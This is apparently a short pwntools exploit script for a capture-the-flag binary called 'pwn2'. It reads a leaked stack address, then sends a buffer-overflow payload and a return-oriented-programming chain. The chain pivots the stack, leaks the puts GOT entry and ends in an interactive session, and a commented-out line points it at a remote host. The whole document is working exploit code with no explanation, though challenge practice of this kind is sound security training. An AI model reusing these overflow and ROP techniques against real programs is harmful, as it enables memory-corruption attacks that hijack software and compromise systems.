from kk import *
context(arch='amd64', os='linux')
#p = remote('192.168.127.12', 10001)
p = process('./pwn2')
elf = ELF('./pwn2')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')

pop_rdi_call_puts = 0x40120D
mov_rax_rbp = 0x4011C8
pop_rbp = 0x000000000040114d
leave = 0x4011CF

GDB(p)
p.recvuntil(b'Please keep')
line = p.recvline()
m = re.search(b'0x[0-9a-fA-F]+', line)
rbp = int(m.group(), 16)
print(f"[+] rbp = {hex(rbp)}")

p.recvuntil(b"I think you can overcome it!")
pay1 = b'a'*0x38 + p64(rbp-0x50) + p64(rbp) + p64(elf.symbols['main'])
p.send(pay1)

p.recvuntil(b"I think you can overcome it!")
pay = p64(pop_rbp) + p64(elf.got['puts']) + p64(mov_rax_rbp) + p64(pop_rdi_call_puts) 
pay +=  p64(elf.symbols['func']) + b'a'*0x18+ p64(rbp-0x50) + p64(leave)
p.send(pay)

p.interactive()